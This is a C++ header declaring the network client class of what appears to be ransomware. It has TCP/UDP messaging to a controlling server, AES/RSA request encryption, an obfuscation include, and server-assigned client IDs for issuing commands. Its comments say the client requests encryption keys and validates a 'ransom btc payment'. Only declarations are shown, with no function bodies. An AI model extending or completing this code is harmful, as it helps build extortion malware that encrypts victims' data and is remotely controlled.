#ifndef _CLIENT_H_
#define _CLIENT_H_

#include "framework.h"
#include "net_types.h"
#include "obfuscate.h"
#include "net_common.h"

#include <memory>
#include <algorithm>

class Client {
public:

#ifdef SERVER_RELEASE
    inline void SetClientTCPSocket(SOCKET fd) {
        this->TCPSocket = fd;
    }

    inline void SetClientID(long cuid) {
        this->ClientUID = cuid;
    }
#endif // SERVER_RELEASE

#ifdef CLIENT_RELEASE
    Client(); // dynamically load winsock and put it in loaded dlls
    ~Client(); // unload winsock
	BOOL          Connect();
    BOOL          Disconnect();
    BOOL          MakeServerRequest( ClientRequest request, BOOL udp );
    BOOL          PingServer(SocketTypes serverType);
    BOOL          ReceiveDataOnSocket(SocketTypes s);
    
    /*
        Encrypt a ClientRequest struct with AES by serializing
        to a byte string, then encrypting that bytestring with AES
    */
    BYTESTRING    EncryptClientRequest(ClientRequest req) const;
    
    /*
        Decrypt a ServerRequest that was sent as a BYTESTRING
        from the TCP server.
    */
    ServerRequest DecryptServerRequest(BYTESTRING req); 

    /*
        Set the initial, permanant, encryption key for this client
    */
    inline void   SetEncryptionKey(std::string key) {
        if ( this->EncryptionKey.empty() ) this->EncryptionKey = key;
    }

    /*
        Identify whether the client class has loaded wsa
        and a defined type of socket in 'type'
    */
    BOOL          SocketReady(SocketTypes type) const;

#endif
protected:
#ifdef CLIENT_RELEASE

    /*
        Send a message to the main tcp server
        i.e ask for public encryption key or validating a ransom btc payment
    */
    BOOL          TCPSendMessageToServer(ClientMessage message);

    /*
        Send a message to the udp server with information
        on the action the client wants the server to do,
        i.e connect to tcp server. Updates clients connected server
        to the tcp server info received in the udp response

        UDP Server used for quick communication and queries
    */
    BOOL          UDPSendMessageToServer(ClientMessage message);

    UDPResponse   UDPRecvMessageFromServer();

    // Further details on client
    Server        ConnectedServer = {0};          // Information on the clients connected server
#endif // CLIENT_RELEASE

    SOCKET        UDPSocket       = INVALID_SOCKET;
    SOCKET        TCPSocket       = INVALID_SOCKET;
    std::string   EncryptionKey;                    // Public encryption key for RSA, ENCRYPT AND DECRYPT KEY FOR AES

    /*
        UID is assigned by the server .Used to perform commands on one client.
        Only used on the server. On client, will always remain - 1.
    */ 
    long          ClientUID       = -1;           
};


#endif